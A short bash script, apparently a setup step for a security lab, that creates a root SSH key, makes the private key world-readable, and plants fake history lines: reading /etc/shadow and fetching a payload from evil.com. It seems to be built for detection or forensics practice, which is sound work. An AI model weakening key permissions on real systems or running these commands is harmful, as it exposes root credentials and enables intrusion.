#!/bin/bash
# BREAK: Expose root SSH keys and demonstrate history tampering

# Simulate root SSH key
mkdir -p /root/.ssh
ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N "" -q

# Weaken permissions
chmod 644 /root/.ssh/id_rsa
chmod 755 /root/.ssh/

# Plant fake history
echo "ssh root@192.168.1.50" >> /root/.bash_history
echo "cat /etc/shadow" >> /root/.bash_history
echo "wget http://evil.com/payload.sh" >> /root/.bash_history

echo "[BREAK] exposed files:"
ls -la /root/.ssh/
echo "[BREAK] history:"
cat /root/.bash_history
echo "[BREAK] private key readable by all — copy and authenticate anywhere"
